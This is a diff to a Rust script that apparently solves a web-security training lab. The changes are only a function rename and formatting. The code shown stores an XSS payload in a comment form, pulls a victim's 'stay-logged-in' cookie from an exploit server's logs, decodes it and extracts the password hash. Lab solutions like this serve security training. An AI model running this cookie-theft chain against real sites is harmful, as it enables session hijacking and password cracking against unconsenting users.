@@ -50,10 +50,12 @@ fn main() {
 
     let start_time = time::Instant::now(); // capture the time before enumeration
 
-    let is_exloited = exploit_xss_in_comment_functionality(&client, url, exploit_server_url); // put an XSS payload in the comment 
-    if is_exloited { // if you injected XSS successfully
-        let cookie = extract_victim_cookie_from_logs(&client, exploit_server_url); // try to extract the cookie from the your server logs
-        if let Some(encrypt) = cookie { // if you found the cookie
+    let is_exloited = exploit_xss_in_comment_functionality(&client, url, exploit_server_url); // put an XSS payload in the comment
+    if is_exloited {
+        // if you injected XSS successfully
+        let cookie = extract_cookie_from_logs(&client, exploit_server_url); // try to extract the cookie from the your server logs
+        if let Some(encrypt) = cookie {
+            // if you found the cookie
             let decrypted = decode_cookie(encrypt); // decrypt the cookie
             let hash = decrypted.split(":").nth(1).unwrap(); // get the hash and exclude the name
             println!(
@@ -113,11 +115,10 @@ fn exploit_xss_in_comment_functionality(
     }
 }
 
-
 /*****************************************************************
 * Function used to extract the cookie from the exploit sever logs
 ******************************************************************/
-fn extract_victim_cookie_from_logs(client: &Client, exploit_server_url: &str) -> Option<String> {
+fn extract_cookie_from_logs(client: &Client, exploit_server_url: &str) -> Option<String> {
     let pattern = Regex::new("stay-logged-in=(.*) HTTP").unwrap();
     let logs = client.get(format!("{exploit_server_url}/log")).send();
     if let Ok(res) = logs {
@@ -142,7 +143,7 @@ fn extract_victim_cookie_from_logs(client: &Client, exploit_server_url: &str) ->
 }
 
 /**********************************************
-* Function used to decode the extracted cookie 
+* Function used to decode the extracted cookie
 ***********************************************/
 fn decode_cookie(cookie: String) -> String {
     println!("{}", "3. Decoding the encrypted cookie.. ☑️".white().bold());
